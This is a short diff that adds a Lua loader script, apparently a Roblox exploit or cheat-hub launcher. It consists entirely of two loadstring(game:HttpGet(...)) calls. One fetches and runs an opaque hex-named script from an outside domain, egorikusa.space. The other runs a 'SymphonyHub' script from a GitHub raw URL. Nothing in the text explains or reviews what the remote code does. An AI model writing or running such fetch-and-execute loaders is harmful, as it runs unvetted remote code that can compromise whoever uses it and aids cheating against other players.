@@ -1,0 +1,3 @@
+getgenv().gui = false
+loadstring(game:HttpGet("https://egorikusa.space/b40c97650ceef47f7b328595.lua", true))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/ThatSick/ArrayField/main/SymphonyHub.lua'))()
